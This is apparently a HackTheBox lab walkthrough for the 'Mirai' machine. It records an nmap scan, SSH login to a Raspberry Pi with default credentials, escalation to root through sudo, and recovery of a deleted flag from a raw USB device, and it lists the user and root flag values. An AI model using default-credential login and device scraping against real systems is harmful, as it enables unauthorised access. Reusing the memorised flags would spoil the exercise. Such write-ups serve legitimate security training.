# HackTheBox Walkthrough - Mirai

**Machine Name**: Mirai  
**Target IP**: 10.129.95.255  
**Operating System**: Linux  
**Difficulty**: Easy  

---

## 🧭 Enumeration

### 🔍 Nmap Scan

```bash
nmap -sV -sC -oA nmap/Mirai 10.129.95.255
```

**Ports Identified:**
```
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3
53/tcp    open  domain  dnsmasq 2.76
80/tcp    open  http    lighttpd 1.4.35
1091/tcp  open  upnp    Platinum UPnP 1.0.5.13
32400/tcp open  http    Plex Media Server httpd
32469/tcp open  upnp    Platinum UPnP 1.0.5.13
```

---

## 🌐 Web Enumeration

### Port 80 - HTTP

Header reveals unusual entry:

```
X-Pi-hole: The Pi-hole Web interface is working!
```

Default dashboard:
```
/admin
```

Identified service: **Pi-hole**

---

## 🔐 Credential Discovery

### Raspberry Pi Default Credentials

- **Username**: `pi`
- **Password**: `raspberry`

### SSH Access

```bash
ssh pi@10.129.95.255
# Password: raspberry
```

---

## 📥 User Flag

```bash
cat /home/pi/Desktop/user.txt
```
**Flag:** `ff837707441b257a20e32199d7c8838d`

---

## 🚀 Privilege Escalation

`pi` is in the `sudo` group:

```bash
sudo su
```

### Root Flag

```bash
cat /root/root.txt
# I lost my original root.txt! I think I may have a backup on my USB stick...
```

Inspect mounted devices:

```bash
lsblk
# sdb is mounted at /media/usbstick
```

```bash
cat /media/usbstick/damnit.txt
```

Nothing useful, recover deleted content:

```bash
sudo strings /dev/sdb | grep -i root.txt
```

Recovered root flag:

**Flag:** `3d3e483143ff12ec505d026fa13e020b`

---

## ✅ Summary

| Item        | Value                                      |
|-------------|--------------------------------------------|
| User        | pi                                         |
| User Flag   | `ff837707441b257a20e32199d7c8838d`         |
| Root Flag   | `3d3e483143ff12ec505d026fa13e020b`         |
| Priv Esc    | sudo + recovery from `/dev/sdb`           |